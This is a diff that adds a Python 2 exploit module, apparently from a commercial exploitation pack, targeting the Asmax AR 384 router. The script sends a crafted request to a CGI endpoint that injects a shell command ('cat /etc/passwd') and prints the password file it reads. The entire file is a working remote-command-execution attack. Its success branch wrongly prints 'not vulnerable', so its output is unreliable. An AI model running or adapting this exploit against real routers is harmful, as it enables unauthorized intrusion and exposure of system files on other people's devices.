@@ -1,0 +1,43 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_asmax_4'
+_vendor_ = 'asmax'
+_model_  = ['AR 384']
+_vuln_   = 'Remote Code Execution Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    cmd = 'cat /etc/passwd'
+    url = "http://%s/cgi-bin/script?system%%20%s" % (host, cmd)
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error (%s)' % e
+    return
+  if response.status_code != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  if 'root' not in response.text:
+    print '[+] %s not vulnerable' % host
+    return
+  print '[+] %s not vulnerable' % host
+  print response.text 
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
